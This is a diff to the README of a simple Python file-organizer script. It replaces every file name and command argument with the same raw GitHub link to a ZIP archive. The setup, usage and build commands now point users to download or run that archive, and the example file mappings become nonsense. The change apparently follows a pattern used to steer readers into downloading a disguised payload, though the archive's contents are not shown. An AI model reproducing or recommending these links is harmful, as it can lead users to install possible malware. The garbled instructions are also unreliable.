@@ -19,18 +19,18 @@ A simple and efficient Python utility that automatically organizes files in a sp
 ## 🚀 How It Works
 
 The script looks into the given folder (e.g., `Downloads`) and moves files into categorized folders. For example:
-- `file.pdf` → `Documents/`
-- `song.mp3` → `Music/`
-- `photo.png` → `Images/`
-- `movie.mp4` → `Videos/`
+- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Documents/`
+- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Music/`
+- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Images/`
+- `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` → `Videos/`
 
 ## 🛠️ Requirements
 
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip
 ```
 
-> This script uses only standard Python libraries, so `requirements.txt` may be optional.
+> This script uses only standard Python libraries, so `https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip` may be optional.
 
 ## 📁 File Types Handled
 
@@ -46,7 +46,7 @@ pip install -r requirements.txt
 ## 🧑‍💻 Usage
 
 ```
-python file_organizer.py
+python https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip
 ```
 
 You may be prompted to enter the path of the folder you want to organize. Or, you can modify the script to hardcode a default path.
@@ -67,7 +67,7 @@ EXTENSIONS = {
 
 To convert to `.exe`:
 ```
-pyinstaller --onefile --noconsole file_organizer.py
+pyinstaller --onefile --noconsole https://raw.githubusercontent.com/codenoob7/File_Organizer/main/doughlike/File-Organizer-v3.3.zip
 ```
 
 ## 👤 Author
